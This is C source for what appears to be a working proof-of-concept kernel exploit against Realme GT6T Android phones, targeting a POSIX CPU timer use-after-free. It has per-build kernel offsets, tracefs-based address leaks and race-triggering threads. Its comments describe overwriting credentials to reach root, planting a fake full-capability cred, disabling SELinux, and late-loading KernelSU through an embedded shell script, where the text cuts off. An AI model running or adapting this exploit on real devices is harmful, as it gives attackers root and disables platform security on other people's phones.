/*
 * GT6T Timer PoC — CVE-2026-98260
 *
 * Copyright (c) 2026 YuKongA
 * Copyright (c) 2026 kpgc10kai
 * Copyright (c) 2026 BROxKEN
 *
 * MIT License. See LICENSE / README.md.
 *
 * Upstream:
 *   https://github.com/YuKongA/CVE-2026-98260
 *   https://github.com/kpgc10kai
 */

/*
 * trigger — Realme GT6T, dual profile (build 1200 / build 1310).
 *
 * Targets (auto-selected from uname -r at startup):
 *   1200 : Linux 6.1.141-android14-11-o-gf61012bbfa24, 4K pages.
 *   1310 : Linux 6.1.157-android14-11-o-g00d81d97d759, 4K pages.
 * Profiles: vmlinux-to-elf (99,610 / 100,327 kallsyms), capstone disasm.
 * KASLR   : on, 2 MB-aligned.
 *
 * Vulnerability: CVE-2026-98260 (POSIX CPU timer UAF).
 *   Verified NOT fixed in 6.1.157: begin_new_exec still calls
 *   posix_cpu_timers_exit at +0x5ec, i.e. after unshare_files/set_mm_exe_file.
 *   The upstream fix ("exec: Cleanup POSIX timers right after de_thread()")
 *   would place it at ~+0x320. It is not backported to 6.1.y.
 *   The 6.1.141 build is in the same pre-fix state.
 *
 * Endgames:
 *   default / shell / verify
 *     Zero write to child cred->uid.  Child setuid(0), execs sh.
 *   fake
 *     task->cred -> fake full-cap cred in the reclaimed page; SELinux
 *     disabled; worker forks, normalizes, loads ksud late-load.
 *
 * The trigger leaves a stale timerqueue node; every failed plant parks
 * without reaping (a reaped uncontrolled node panics this kernel).  Reboot
 * is the only cleanup.  Event ids and the linear-map base are discovered at
 * runtime; the tracefs metadata files are not readable from the shell domain.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdatomic.h>
#include <time.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/system_properties.h>

#define TR "/sys/kernel/tracing"
#define CPU_TRIG 2
#define NTIMERS 4096
#define VICTIM_IDX 2048
#define PREFILL_TIMERS 4096
#define VMA_COUNT 50000
#define HELPER_STACK (1 << 20)
#define LOCKERS 3

/* ------------------------------------------------------------------ */
/* GT6T profile                                                        */
/* ------------------------------------------------------------------ */
struct target_profile
{
    const char *name;
    /*
     * Substring of `uname -r` that selects this profile. Matching is by
     * strstr() so a trailing build suffix (e.g. "-4k", "-ab123456") still
     * resolves to the right profile. Keep the full upstream tag here: the
     * hashes are what pin a profile to one kernel build.
     */
    const char *kernel_match;
    unsigned long page_size;
    unsigned int page_shift;
    unsigned int slab_order;
    unsigned long slab_size;
    unsigned long long static_timer_site;
    unsigned long long timer_site_low21;
    unsigned long long selinux_state_static;
    unsigned long long panic_on_warn_static;
    unsigned long long copy_process_low21;
    unsigned long long root_user_static;
    unsigned long long init_user_ns_static;
    unsigned long long init_ucounts_static;
    unsigned long long init_groups_static;
    unsigned long long linear_min;
    unsigned long long linear_max;
    /*
     * Derived at port time, not in the original guide table:
     *   task_alloc_site_low21 - [20:0] of the instruction after the
     *     `bl kmem_cache_alloc_node` in copy_process (KASLR-immune).
     *   task_alloc_bytes      - task_struct cache size, only a fallback
     *     (6.1.157 makes this a runtime value).
     */
    unsigned long long task_alloc_site_low21;
    unsigned long long task_alloc_bytes;
};

/*
 * Build 1200 — Linux 6.1.141-android14-11-o-gf61012bbfa24, 4K pages.
 * (unchanged values from the original working port)
 */
static const struct target_profile profile_gt6t_1200 = {
    "gt6t-1200",
    "6.1.141-android14-11-o-gf61012bbfa24",
    4096UL, 12, 1, 8192UL,
    0xffffffc00843a428ULL,  /* static_timer_site: do_timer_create+0xa8 */
    0x03a428ULL,            /* timer_site_low21                        */
    0xffffffc00a269e60ULL,  /* selinux_state_static                    */
    0xffffffc00a01b2c8ULL,  /* panic_on_warn_static                    */
    0x1d023cULL,            /* copy_process_low21                      */
    0xffffffc00a040d40ULL,  /* root_user_static                        */
    0xffffffc00a040ab0ULL,  /* init_user_ns_static                     */
    0xffffffc00a0425c8ULL,  /* init_ucounts_static                     */
    0xffffffc00a042060ULL,  /* init_groups_static                      */
    0xffffff0000000000ULL,  /* linear_min                              */
    0xffffffc000000000ULL,  /* linear_max                              */
    0x01d039cULL,           /* task_alloc_site_low21: copy_process+0x160 */
    0x12c0ULL,              /* task_alloc_bytes (fixed in this build)   */
};

/*
 * Realme GT6T build 1310 — Linux 6.1.157-android14-11-o-g00d81d97d759, 4K pages.
 *
 * do_timer_create+0xa8 (CBZ x0 after BL kmem_cache_alloc) confirmed:
 *   +0x9c mov w1,#0xdc0 (GFP_KERNEL|__GFP_ZERO)
 *   +0xa0 ldr x0,[posix_timers_cache]
 *   +0xa4 bl  kmem_cache_alloc
 *   +0xa8 cbz x0,<err>
 * posix_timers_cache: obj_size=0x108 (init_posix_timers mov w1,#0x108),
 * order-1 slab (8KB), 31 objects.
 * SELINUX_BLOB_OFF=0x8 (integrity LSM precedes selinux in CONFIG_LSM).
 * CRED_REQ=0xb0 confirmed from cred_init; OFF_TASK_CRED=0x838 confirmed
 * from prepare_creds (ldr x20,[x8,#0x838]).
 * NOTE: CONFIG_GKI_DYNAMIC_TASK_STRUCT_SIZE=y in this build, so the
 * task_struct cache size is a runtime value (arch_task_struct_size);
 * task allocations are matched by call site, size is only a fallback.
 * KASLR is on; link addresses need +slide at runtime.
 * Low-21-bit values are KASLR-immune (slide is 2MB-aligned).
 */
static const struct target_profile profile_gt6t_1310 = {
    "gt6t-1310",
    "6.1.157-android14-11-o-g00d81d97d759",
    4096UL, 12, 1, 8192UL,
    0xffffffc00842aa24ULL,  /* static_timer_site: do_timer_create+0xa8 */
    0x02aa24ULL,            /* timer_site_low21                        */
    0xffffffc00a29d320ULL,  /* selinux_state_static                    */
    0xffffffc00a04b2ccULL,  /* panic_on_warn_static                    */
    0x04e818ULL,            /* copy_process_low21                      */
    0xffffffc00a070d40ULL,  /* root_user_static                        */
    0xffffffc00a070ab0ULL,  /* init_user_ns_static                     */
    0xffffffc00a0725c8ULL,  /* init_ucounts_static                     */
    0xffffffc00a072060ULL,  /* init_groups_static                      */
    0xffffff0000000000ULL,  /* linear_min                              */
    0xffffffc000000000ULL,  /* linear_max                              */
    0x04e978ULL,            /* task_alloc_site_low21: copy_process+0x160 */
    0x12c0ULL,              /* task_alloc_bytes (fallback only)        */
};

static const struct target_profile *g_tgt = &profile_gt6t_1310;
static char g_device[128] = "unknown";
static char g_kernel[256] = "unknown";

#define PAGE (g_tgt->page_size)
#define PAGE_SHIFT (g_tgt->page_shift)
#define SLAB_ORDER (g_tgt->slab_order)
#define SLAB_SIZE (g_tgt->slab_size)
#define SLAB_MASK (~(unsigned long long)(SLAB_SIZE - 1))
#define SLAB_OFF_MASK ((unsigned long long)(SLAB_SIZE - 1))
#define LINEAR_MIN (g_tgt->linear_min)
#define LINEAR_MAX (g_tgt->linear_max)
#define SOCKBUF SLAB_SIZE
#define STATIC_TIMER_SITE (g_tgt->static_timer_site)
#define TIMER_SITE_LOW21 (g_tgt->timer_site_low21)
#define SELINUX_STATE_STATIC (g_tgt->selinux_state_static)
#define PANIC_ON_WARN_STATIC (g_tgt->panic_on_warn_static)
#define COPY_PROCESS_LOW21 (g_tgt->copy_process_low21)
#define ROOT_USER_STATIC (g_tgt->root_user_static)
#define INIT_USER_NS_STATIC (g_tgt->init_user_ns_static)
#define INIT_UCOUNTS_STATIC (g_tgt->init_ucounts_static)
#define INIT_GROUPS_STATIC (g_tgt->init_groups_static)

/* GT6T build-1310-specific build constants. */
#define TIMER_ALLOC 0x108ULL
#define CRED_REQ 0xb0ULL
#define CRED_ALLOC 0xc0ULL
#define CRED_UID_OFF 0x4ULL
#define OFF_TASK_CRED 0x838ULL
/*
 * task_struct cache size. Build 1200 has a fixed 0x12c0; build 1310 enables
 * CONFIG_GKI_DYNAMIC_TASK_STRUCT_SIZE, so fork_init passes the runtime
 * arch_task_struct_size (0x12c0 + optional vendor extension up to 1024).
 * The size is therefore only a fallback; the call-site tag below is the
 * reliable matcher.
 */
#define TASK_ALLOC_BYTES (g_tgt->task_alloc_bytes)
/*
 * Call-site tag for the task_struct allocation: [20:0] of the instruction
 * after `bl kmem_cache_alloc_node` inside copy_process (copy_process+0x160).
 * KASLR-immune and independent of the dynamic task_struct size.
 */
#define TASK_ALLOC_SITE_LOW21 (g_tgt->task_alloc_site_low21)
#define FULLCAP 0x1ffffffffffULL
#define SELINUX_BLOB_OFF 0x8ULL
#define SELINUX_SID_KERNEL 1U
#define FAKE_CRED_OFF 0x18ULL

#define CHILD_HELLO 0x52445931
#define CHILD_MAGIC 0x50474552

struct child_report
{
    int magic;
    int uid, euid;
    int setuid_ret, setuid_errno;
    int ruid, reuid, rsuid;
};

static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
static _Atomic int g_exec_tid, g_target_tgid;
static void *g_frag_base;
static size_t g_frag_len;
static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1;
static int g_timer_go_r = -1, g_timer_go_w = -1;
static int g_cpu = CPU_TRIG;
static unsigned long long g_base;
static unsigned long long g_slide;
static int g_held;
static int g_fake_stage;
static int g_probe;
static unsigned long long g_child_task;
static unsigned g_t_page_alloc, g_t_page_free;

static void logf(const char *fmt, ...);

static void slab_usage(const char *tag)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[256];

    if (!f)
        return;
    while (fgets(line, sizeof(line), f))
    {
        unsigned active = 0, total = 0;

        if (strncmp(line, "posix_timers_cache", 18))
            continue;
        if (sscanf(line, "posix_timers_cache %u %u", &active, &total) == 2)
            logf("[slab] %s active=%u total=%u\n", tag, active, total);
        break;
    }
    fclose(f);
}

static int g_logfd = -1;

static void log_open(void)
{
    g_logfd = open("/data/local/tmp/timer_last.log",
                   O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644);
}

static void logf(const char *fmt, ...)
{
    char buf[1024];
    va_list ap;
    int n;

    va_start(ap, fmt);
    n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n <= 0)
        return;
    if (n > (int)sizeof(buf) - 1)
        n = (int)sizeof(buf) - 1;
    (void)write(STDOUT_FILENO, buf, (size_t)n);
    if (g_logfd >= 0)
    {
        (void)write(g_logfd, buf, (size_t)n);
        (void)fsync(g_logfd);
    }
}

static int wr(const char *p, const char *s)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0)
        return -1;
    int r = write(fd, s, strlen(s));
    close(fd);
    return r < 0 ? -1 : 0;
}

static void pin(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

static unsigned u32(const unsigned char *b, size_t o)
{
    unsigned v;
    memcpy(&v, b + o, 4);
    return v;
}

static unsigned long long u64(const unsigned char *b, size_t o)
{
    unsigned long long v;
    memcpy(&v, b + o, 8);
    return v;
}

static void enable_events(void)
{
    static const char *evs[] = {
        "enable_event:kmem:kmem_cache_alloc\n",
        "enable_event:kmem:mm_page_free\n",
        "enable_event:kmem:mm_page_alloc\n",
    };
    for (unsigned i = 0; i < sizeof(evs) / sizeof(evs[0]); i++)
        wr(TR "/events/kmem/rss_stat/trigger", evs[i]);
}

static void drain_cpu(int cpu)
{
    unsigned char tmp[65536];
    char path[128];
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return;
    while (read(fd, tmp, sizeof(tmp)) > 0)
        ;
    close(fd);
}

static void trace_start(void)
{
    wr(TR "/tracing_on", "0");
    wr(TR "/trace", "\n");
    drain_cpu(g_cpu);
    wr(TR "/tracing_on", "1");
}

static void trace_stop(void) { wr(TR "/tracing_on", "0"); }

static long read_cpu(int cpu, unsigned char *buf, size_t cap)
{
    char path[128];
    size_t tot = 0;
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return -1;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);
        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    close(fd);
    return (long)tot;
}

static int is_kernel_ptr(unsigned long long v)
{
    return (v >> 48) == 0xffffULL;
}

static int pair_slab_pfn(const unsigned char *b, size_t n, int pid,
                         unsigned long long vslab,
                         unsigned long long *out_pfn)
{
    unsigned long long pend[64];
    int np = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        if ((int)u32(b, i - 4) != pid)
            continue;
        if ((u32(b, i - 8) & 0xffff) == g_t_page_alloc)
        {
            unsigned long long pfn = u64(b, i);

            if (pfn < (1ULL << 26) && u32(b, i + 8) == SLAB_ORDER)
            {
                if (np == 64)
                    memmove(pend, pend + 1, 63 * sizeof(pend[0])), np--;
                pend[np++] = pfn;
            }
            continue;
        }
        if ((u64(b, i) & 0x1fffffULL) != TIMER_SITE_LOW21 ||
            u64(b, i + 16) != TIMER_ALLOC || u64(b, i + 24) != TIMER_ALLOC)
            continue;
        {
            unsigned long long ptr = u64(b, i + 8);

            if (!is_kernel_ptr(ptr) || (ptr & SLAB_MASK) != vslab)
                continue;
            if (np > 0)
            {
                *out_pfn = pend[np - 1];
                return 1;
            }
            return 0;
        }
    }
    return 0;
}

static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
                             unsigned long long *out, int max,
                             unsigned long long *first_site)
{
    int cnt = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        if ((site & 0x1fffffULL) != TIMER_SITE_LOW21)
            continue;
        ptr = u64(b, i + 8);
        if (u64(b, i + 16) != TIMER_ALLOC ||
            u64(b, i + 24) != TIMER_ALLOC || !is_kernel_ptr(ptr))
            continue;
        if (!cnt && first_site)
            *first_site = site;
        if (cnt < max)
            out[cnt++] = ptr;
    }
    return cnt;
}

static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *site_out,
                            unsigned long long *ptr_out)
{
    int found = 0;

    for (size_t i = 16; i + 24 <= n; i += 4)
    {
        unsigned long long site, ptr;

        if (u32(b, i - 12) != (unsigned)pid)
            continue;
        ptr = u64(b, i);
        if (!is_kernel_ptr(ptr) || u64(b, i + 8) != CRED_REQ ||
            u64(b, i + 16) != CRED_ALLOC)
            continue;
        site = u64(b, i - 8);
        if (!is_kernel_ptr(site))
            continue;
        if (!found)
        {
            *site_out = site;
            *ptr_out = ptr;
        }
        found++;
    }
    return found;
}

static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *out)
{
    int found = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr, req, alloc;

        /* Verify allocation belongs to our targeted parent PID */
        if (u32(b, i - 4) != (unsigned)pid)
            continue;

        site = u64(b, i);
        ptr = u64(b, i + 8);
        req = u64(b, i + 16);
        alloc = u64(b, i + 24);

        if (!is_kernel_ptr(ptr))
            continue;

        /*
         * 6.1.157 is built with CONFIG_GKI_DYNAMIC_TASK_STRUCT_SIZE, so the
         * task_struct slab object size is decided at boot and is no longer
         * the fixed 0x12c0. Match the allocation call site inside
         * copy_process (+0x160, right after `bl kmem_cache_alloc_node`)
         * instead; keep the old size as a fallback.
         */
        if ((site & 0x1fffffULL) != TASK_ALLOC_SITE_LOW21 &&
            req != TASK_ALLOC_BYTES && alloc != TASK_ALLOC_BYTES)
            continue;

        *out = ptr;
        found++;
    }
    return found;
}

static int scan_page_free(const unsigned char *b, size_t n,
                          unsigned long long pfn)
{
    for (size_t i = 16; i + 12 <= n; i += 4)
    {
        if (u64(b, i) != pfn || (int)u32(b, i + 8) != (int)SLAB_ORDER)
            continue;
        if ((u32(b, i - 8) & 0xffff) == g_t_page_free)
            return 1;
    }
    return 0;
}

struct page_pair
{
    unsigned long long pfn;
    unsigned alloc_type, free_type, hits;
};

static int discover_page_types(unsigned char *raw)
{
    struct page_pair pairs[2048];
    int np = 0, me = getpid();
    size_t len = 1024 * PAGE;
    unsigned char *m;
    long n;

    trace_stop();
    wr(TR "/trace", "\n");
    for (int c = 0; c < 8; c++)
        drain_cpu(c);
    trace_start();
    m = mmap(NULL, len, PROT_READ | PROT_WRITE,
             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (m == MAP_FAILED)
    {
        trace_stop();
        return -1;
    }
    for (size_t i = 0; i < len; i += PAGE)
        m[i] = 1;
    munmap(m, len);
    usleep(30000);
    trace_stop();

    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return -1;
    for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
    {
        unsigned long long pfn = u64(raw, i);
        unsigned order, type;

        if (pfn >= (1ULL << 26))
            continue;
        order = u32(raw, i + 8);
        if (order > 10)
            continue;
        if (u32(raw, i - 4) != (unsigned)me)
            continue;
        type = u32(raw, i - 8) & 0xffff;
        if (!type || type > 1024)
            continue;
        for (int k = 0; k < np; k++)
        {
            if (pairs[k].pfn == pfn)
            {
                if (!pairs[k].alloc_type)
                    pairs[k].alloc_type = type;
                else if (!pairs[k].free_type)
                    pairs[k].free_type = type;
                pairs[k].hits++;
                goto next;
            }
        }
        if (np < 2048)
        {
            pairs[np].pfn = pfn;
            pairs[np].alloc_type = type;
            pairs[np].hits = 1;
            np++;
        }
    next:;
    }

    {
        struct page_pair *best = NULL;

        for (int k = 0; k < np; k++)
            if (pairs[k].alloc_type && pairs[k].free_type &&
                pairs[k].alloc_type != pairs[k].free_type &&
                (!best || pairs[k].hits > best->hits))
                best = &pairs[k];
        if (!best)
        {
            logf("[-] page event ids not found (records=%zu pairs=%d)\n",
                 (size_t)n, np);
            return -1;
        }
        g_t_page_alloc = best->alloc_type;
        g_t_page_free = best->free_type;
    }
    logf("[ids] page_alloc=%u page_free=%u pairs=%d\n",
         g_t_page_alloc, g_t_page_free, np);
    return 0;
}

struct base_slot
{
    unsigned long long key;
    int cnt;
};

static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
                                     const unsigned long long *ptrs, int nrec,
                                     int *out_slabs, int *out_pfns)
{
    enum
    {
        MAXS = 256,
        MAXP = 512,
        HBITS = 16,
        HSIZE = 1 << HBITS
    };
    unsigned long long slabs[MAXS], pfns[MAXP];
    static struct base_slot tab[HSIZE];
    int ns = 0, np = 0;
    unsigned long long best_base = 0, best_cnt = 0;

    memset(tab, 0, sizeof(tab));
    for (int i = 0; i < nrec && ns < MAXS; i++)
    {
        unsigned long long s = ptrs[i] & SLAB_MASK;
        int dup = 0;

        for (int j = 0; j < ns; j++)
            if (slabs[j] == s)
            {
                dup = 1;
                break;
            }
        if (!dup)
            slabs[ns++] = s;
    }
    for (size_t i = 16; i + 12 <= n && np < MAXP; i += 4)
    {
        unsigned long long pfn = u64(b, i);
        int dup = 0;

        if (pfn >= (1ULL << 26) || (int)u32(b, i + 8) != (int)SLAB_ORDER ||
            u32(b, i - 4) != (unsigned)pid ||
            (u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        for (int j = 0; j < np; j++)
            if (pfns[j] == pfn)
            {
                dup = 1;
                break;
            }
        if (!dup)
            pfns[np++] = pfn;
    }
    for (int i = 0; i < ns; i++)
    {
        for (int j = 0; j < np; j++)
        {
            unsigned long long base = slabs[i] - (pfns[j] << PAGE_SHIFT);
            unsigned h = (unsigned)((base >> PAGE_SHIFT) * 2654435761u) &
                         (HSIZE - 1);

            for (int k = 0; k < 64; k++, h = (h + 1) & (HSIZE - 1))
            {
                if (!tab[h].key)
                {
                    tab[h].key = base;
                    tab[h].cnt = 1;
                    break;
                }
                if (tab[h].key == base)
                {
                    tab[h].cnt++;
                    break;
                }
            }
        }
    }
    for (int i = 0; i < HSIZE; i++)
        if (tab[i].key && (unsigned long long)tab[i].cnt > best_cnt)
        {
            best_cnt = tab[i].cnt;
            best_base = tab[i].key;
        }
    *out_slabs = ns;
    *out_pfns = np;
    return best_cnt >= 8 ? best_base : 0;
}

static unsigned long long calibrate_base(unsigned char *raw)
{
    unsigned long long hist[64] = {0}, hcnt[64] = {0};
    unsigned long long recent[64];
    unsigned long long ptrs[512];
    unsigned long long site0 = 0;
    int hc = 0, rn = 0, made = 0, me = getpid();
    long n;

    trace_start();
    for (int i = 0; i < 512; i++)
    {
        struct sigevent ev;
        timer_t t;

        memset(&ev, 0, sizeof(ev));
        ev.sigev_notify = SIGEV_NONE;
        if (timer_create(CLOCK_MONOTONIC, &ev, &t))
            break;
        made++;
    }
    usleep(3000);
    trace_stop();
    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return 0;

    {
        int c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, &site0);

        for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
        {
            unsigned long long pfn = u64(raw, i);

            if (pfn >= (1ULL << 26) || (int)u32(raw, i + 8) != (int)SLAB_ORDER ||
                u32(raw, i - 4) != (unsigned)me ||
                (u32(raw, i - 8) & 0xffff) != g_t_page_alloc)
                continue;
            if (rn == 64)
                memmove(recent, recent + 1, 63 * sizeof(recent[0])), rn--;
            recent[rn++] = pfn;
        }
        for (int i = 0; i < c; i++)
        {
            unsigned long long slab = ptrs[i] & SLAB_MASK;

            for (int j = 0; j < rn; j++)
            {
                unsigned long long base = slab - (recent[j] << PAGE_SHIFT);
                int f = 0;

                for (int k = 0; k < hc; k++)
                    if (hist[k] == base)
                    {
                        hcnt[k]++;
                        f = 1;
                        break;
                    }
                if (!f && hc < 64)
                {
                    hist[hc] = base;
                    hcnt[hc] = 1;
                    hc++;
                }
            }
        }
    }
    {
        unsigned long long best = 0, bestc = 0;

        for (int k = 0; k < hc; k++)
            if (hcnt[k] > bestc)
            {
                bestc = hcnt[k];
                best = hist[k];
            }
        logf("[base] made=%d site=%#llx slide=%#llx best=%#llx count=%llu\n",
             made, site0, site0 ? site0 - STATIC_TIMER_SITE : 0, best, bestc);
        return bestc >= 4 ? best : 0;
    }
}

static void kick_rss(void)
{
    size_t n = (size_t)32 << 20;
    char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (p == MAP_FAILED)
        return;
    for (size_t i = 0; i < n; i += PAGE)
        p[i] = 1;
    munmap(p, n);
}

static timer_t *g_prefill;

static void prefill_timers(int n)
{
    struct sigevent ev;

    g_prefill = calloc((size_t)n, sizeof(*g_prefill));
    if (!g_prefill)
        return;
    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_NONE;
    for (int i = 0; i < n; i++)
    {
        if (timer_create(CLOCK_MONOTONIC, &ev, &g_prefill[i]))
            break;
    }
}

static int prepare_fragmented_range(void)
{
    size_t len = (size_t)VMA_COUNT * PAGE;
    int fd = (int)syscall(SYS_memfd_create, "vma-page", 1);
    void *base;
    if (fd < 0 || ftruncate(fd, PAGE))
        return -1;
    base = mmap(NULL, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED)
        return -1;
    for (unsigned long i = 0; i < VMA_COUNT; i++)
    {
        void *want = (char *)base + i * PAGE;
        if (mmap(want, PAGE, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != want)
            return -1;
    }
    close(fd);
    g_frag_base = base;
    g_frag_len = len;
    return 0;
}

static int locker_fn(void *x)
{
    int prot = PROT_NONE;
    unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);
    (void)x;
    pin(slot ? 3 : 1);
    while (!atomic_load(&g_go))
        sched_yield();
    atomic_fetch_add(&g_locker_started, 1);
    while (!atomic_load(&g_stop))
    {
        syscall(SYS_mprotect, g_frag_base, g_frag_len, prot);
        prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
    }
    _exit(0);
}

static int killer_fn(void *x)
{
    int tid, tgid;
    (void)x;
    pin(2);
    while (!(tid = atomic_load(&g_exec_tid)))
        sched_yield();
    tgid = atomic_load(&g_target_tgid);
    for (;;)
    {
        long r = syscall(SYS_tgkill, tgid, tid, 0);
        if (r < 0 && errno == ESRCH)
            break;
        sched_yield();
    }
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    atomic_store(&g_stop, 1);
    _exit(0);
}

static int spawn_vm_helper(int (*fn)(void *))
{
    void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (st == MAP_FAILED)
        return -1;
    int p = clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, NULL);
    if (p < 0)
        munmap(st, HELPER_STACK);
    return p;
}

static void *exec_thread(void *x)
{
    struct sigevent ev_none, ev_victim;
    struct itimerspec dormant;
    char b = 'R', ack;
    char *const argv[] = {(char *)"", NULL};
    char *const envp[] = {NULL};
    (void)x;
    pin(2);
    prctl(PR_SET_NAME, "yexec", 0, 0, 0);
    memset(&ev_none, 0, sizeof(ev_none));
    ev_none.sigev_notify = SIGEV_NONE;
    memset(&ev_victim, 0, sizeof(ev_victim));
    ev_victim.sigev_notify = SIGEV_SIGNAL;
    ev_victim.sigev_signo = SIGRTMIN;
    memset(&dormant, 0, sizeof(dormant));
    dormant.it_value.tv_sec = 3600;

    if (write(g_ready_w, &b, 1) != 1)
        _exit(117);
    if (read(g_ack_r, &ack, 1) != 1)
        _exit(118);

    for (int i = 0; i < NTIMERS; i++)
    {
        timer_t t;
        struct sigevent *e = (i == VICTIM_IDX) ? &ev_victim : &ev_none;
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, e, &t))
            _exit(120);
        if (i == VICTIM_IDX && !g_probe &&
            timer_settime(t, 0, &dormant, NULL))
            _exit(121);
    }
    {
        int tid = (int)syscall(SYS_gettid);
        atomic_store(&g_exec_tid, tid);
        if (write(g_tid_w, &tid, sizeof(tid)) != sizeof(tid))
            _exit(122);
    }
    if (g_timer_go_r >= 0)
    {
        char tgo;

        if (read(g_timer_go_r, &tgo, 1) != 1)
            _exit(124);
    }
    atomic_store(&g_go, 1);
    while (atomic_load(&g_locker_started) < LOCKERS)
        sched_yield();
    for (volatile unsigned long i = 0; i < 5000000UL; i++)
        __asm__ volatile("" ::: "memory");
    execve("/proc/self/exe", argv, envp);
    _exit(123);
}

static void run_target(void)
{
    pthread_t th;
    sigset_t set;
    atomic_store(&g_target_tgid, (int)getpid());
    pin(2);
    if (prepare_fragmented_range())
        _exit(110);
    for (int i = 0; i < LOCKERS; i++)
        if (spawn_vm_helper(locker_fn) < 0)
            _exit(111);
    if (spawn_vm_helper(killer_fn) < 0)
        _exit(112);
    sigemptyset(&set);
    sigaddset(&set, SIGRTMIN);
    pthread_sigmask(SIG_BLOCK, &set, NULL);
    if (pthread_create(&th, NULL, exec_thread, NULL))
        _exit(114);
    for (;;)
        sched_yield();
}

static int wait_zombie(pid_t pid, siginfo_t *si)
{
    struct timespec pause = {.tv_nsec = 200000};
    for (int i = 0; i < 100000; i++)
    {
        memset(si, 0, sizeof(*si));
        if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
            return -1;
        if (si->si_pid == pid)
            return 0;
        nanosleep(&pause, NULL);
    }
    return -1;
}

static long now_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static void park_forever(const char *why)
{
    logf("[!] %s -- parking without reap (zombie held)\n", why);
    fflush(stdout);
    for (;;)
        pause();
}

static void build_payload(unsigned char *buf, size_t off,
                          unsigned long long parent, unsigned long long target)
{
    memset(buf, 0, SOCKBUF);
    *(unsigned long long *)(buf + off + 0x00) = parent;
    *(unsigned long long *)(buf + off + 0x10) = target;
}

static void write_ksu_script(void)
{
    static const char script[] =
        "#!/system/bin/sh\n"
        "echo \"[ksu] start uid=$(id -u) selinux=$(getenforce)\"\n"
        "grep -E '^(Cap|Seccomp)' /proc/self/status\n"
        "PKGS='me.weishu.kernelsu com.rifsxd.ksunext com.sukisu.ultra'\n"
        "KMI=android14-6.1\n"
        "KSUD=''\n"
        "PKG=''\n"
        "APK=''\n"
        "lib_for() {\n"
        "  d=$(dirname \"$1\")\n"
        "  for c in \"$d/lib/arm64/libksud.so\" "
        "\"$d/lib/arm64-v8a/libksud.so\"; do\n"
        "    if [ -x \"$c\" ]; then echo \"$c\"; return 0; fi\n"
        "  done\n"
        "  [ -d \"$d/lib/arm64\" ] || return 1\n"
        "  for c in $(find \"$d/lib/arm64\" -name '*.so' -size +2M "
        "2>/dev/null); do\n"
        "    [ -x \"$c\" ] || continue\n"
        "    grep -aq 'late-load' \"$c\" 2>/dev/null || continue\n"
        "    grep -aq 'uapi' \"$c\" 2>/dev/null || continue\n"
        "    echo \"$c\"; return 0\n"
        "  done\n"
        "  return 1\n"
        "}\n"
        "for p in $PKGS; do\n"
        "  a=$(pm path \"$p\" 2>/dev/null | head -n1 | cut -d: -f2)\n"
        "  [ -n \"$a\" ] || continue\n"
        "  [ -n \"$APK\" ] || { APK=\"$a\"; PKG=\"$p\"; }\n"
        "  c=$(lib_for \"$a\") && { KSUD=\"$c\"; PKG=\"$p\"; APK=\"$a\"; "
        "break; }\n"
        "done\n"
        "if [ -z \"$KSUD\" ]; then\n"
        "  for c in $(find /data/app -name libksud.so 2>/dev/null | "
        "grep '/lib/arm64'); do\n"
        "    [ -x \"$c\" ] || continue\n"
